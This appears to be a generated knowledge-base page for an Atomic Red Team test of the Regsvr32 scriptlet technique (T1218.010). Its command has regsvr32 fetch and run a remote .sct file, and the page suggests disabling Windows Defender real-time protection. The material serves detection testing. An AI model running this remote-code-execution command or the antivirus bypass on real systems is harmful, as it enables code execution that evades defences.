---
atomic_guid: "c9d0c4ef-8a96-4794-a75b-3d3a5e6f2a36"
title: "Regsvr32 remote COM scriptlet execution"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218.010"
attack_technique_name: "Signed Binary Proxy Execution: Regsvr32"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "c9d0c4ef-8a96-4794-a75b-3d3a5e6f2a36"
  - "Regsvr32 remote COM scriptlet execution"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Regsvr32 remote COM scriptlet execution

Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable
windows defender real-time protection to fix it. Upon execution, calc.exe will be launched.

## Metadata

- Atomic GUID: c9d0c4ef-8a96-4794-a75b-3d3a5e6f2a36
- Technique: T1218.010: Signed Binary Proxy Execution: Regsvr32
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1218.010/T1218.010.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.010]]

## Input Arguments

### regsvr32name

- description: Default name of Regsvr32.exe
- type: string
- default: regsvr32.exe

### regsvr32path

- description: Default location of Regsvr32.exe
- type: path
- default: C:\Windows\system32

### url

- description: URL to hosted sct file
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct

## Executor

- name: command_prompt

### Command

```cmd
#{regsvr32path}\#{regsvr32name} /s /u /i:#{url} scrobj.dll
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.yaml)
